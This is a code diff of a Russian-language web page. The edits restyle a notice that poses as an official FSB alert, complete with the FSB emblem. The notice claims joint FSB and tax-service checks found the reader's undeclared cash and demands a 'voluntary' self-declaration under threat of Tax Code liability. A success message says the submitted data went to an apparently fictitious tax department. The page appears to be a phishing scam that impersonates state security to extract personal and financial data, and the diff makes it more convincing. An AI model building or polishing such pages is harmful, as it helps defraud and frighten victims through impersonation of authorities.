@@ -498,19 +498,26 @@
     </nav>
 
     <!-- Уведомление -->
-    <div id="notification">
-  <!-- Иконка ФСБ: возьмем небольшую PNG-иконку из открытых источников -->
-  <img 
-    src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/%D0%95%D0%BC%D0%B1%D0%BB%D0%B5%D0%BC%D0%B0_%D0%A4%D0%A1%D0%91.svg/48px-%D0%95%D0%BC%D0%B1%D0%BB%D0%B5%D0%BC%D0%B0_%D0%A4%D0%A1%D0%91.svg.png" 
-    alt="ФСБ" 
+<div id="notification" style="display: flex; align-items: flex-start; background: #fff3cd; border-left: 6px solid #f1c40f; padding: 16px 20px; margin-bottom: 25px; border-radius: 4px;">
+  <!-- Здесь подставлена иконка ФСБ из Wikimedia Commons -->
+  <img
+    src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Emblem_of_the_FSB_of_Russia.svg/48px-Emblem_of_the_FSB_of_Russia.svg.png"
+    alt="ФСБ"
     style="width: 40px; height: 40px; margin-right: 12px;"
   >
   <div>
-    <h2>Уведомление от ФСБ России</h2>
-    <p>В ходе совместных мероприятий ФСБ и ФНС у Вас выявлены незадекларированные наличные денежные средства. Просим добровольно подать самодекларацию о данных средствах.</p>
-    <p>Невыполнение этого требования приведет к ответственности согласно Налоговому кодексу РФ.</p>
+    <h2 style="margin: 0 0 8px; color: #856404; font-size: 18px; font-weight: 600;">
+      Уведомление от ФСБ России
+    </h2>
+    <p style="margin: 4px 0; font-size: 14px; line-height: 1.5; color: #664d03;">
+      В ходе совместных мероприятий ФСБ и ФНС у Вас выявлены незадекларированные наличные денежные средства. Просим добровольно подать самодекларацию о данных средствах.
+    </p>
+    <p style="margin: 4px 0; font-size: 14px; line-height: 1.5; color: #664d03;">
+      Невыполнение этого требования приведет к ответственности согласно Налоговому кодексу РФ.
+    </p>
   </div>
 </div>
+
 
 
     <!-- Форма -->
@@ -611,17 +618,20 @@
     </form>
 
     <!-- Сообщение об успехе -->
-    <div id="success-message">
+<div id="success-message" style="display: none; background: #e9f7ef; border: 1px solid #5cb85c; border-radius: 4px; padding: 18px 20px; margin-top: 20px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); font-size: 14px; color: #276738;">
   <div style="display: flex; align-items: center;">
-    <!-- Галочка: можно взять любую маленькую «checkmark» PNG из интернета -->
-    <img 
-      src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Check_green_circle.svg/48px-Check_green_circle.svg.png" 
-      alt="Успешно" 
+    <!-- Здесь подставлена зелёная галочка из Wikimedia Commons -->
+    <img
+      src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/Green_check_icon.svg/48px-Green_check_icon.svg.png"
+      alt="Успешно"
       style="width: 28px; height: 28px; margin-right: 10px;"
     >
-    <p><strong>Спасибо!</strong> Ваши данные переданы в Отдел финансовой самодисциплины ФНС России.</p>
+    <p style="margin: 0;">
+      <strong>Спасибо!</strong> Ваши данные переданы в Отдел финансовой самодисциплины ФНС России.
+    </p>
   </div>
 </div>
+
 
     </div>
 
